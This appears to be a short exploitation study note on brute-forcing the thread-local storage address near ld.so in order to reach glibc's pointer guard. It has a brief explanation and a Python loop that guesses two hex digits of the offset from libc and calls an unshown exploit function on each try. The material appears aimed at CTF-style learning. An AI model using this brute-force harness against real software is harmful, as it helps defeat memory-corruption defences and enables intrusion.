TLS locates at `ld.so`, which is near by the address of `libc.so`. The last 3 numbers (12 bits) of the address for TLS remain the same, usually we need to brakeforce the 4th & 5th number. Because:

![tls-tcb](PTR Guard Bruteforce.assets/tls-tcb.png)

Brute-forcing script:

```py
for x in range(0x10):
    for y in range(0x10):
        try:
            libc_base = 0xdeadbeef
            offset = 0x6 << 20	# 6th: i.e. starts from 0x600000
            offset += x << 16	# 5th: from 0x600000 to 0x6F0000
            offset += y << 12	# 4th: Increment within each 0x1000 (4KB) memory page
            ld_base = libc_base + offset
            log.success("try offset:\t" + hex(offset))
            # exploit script
            exp()        
        except EOFError:
            p.close()
```

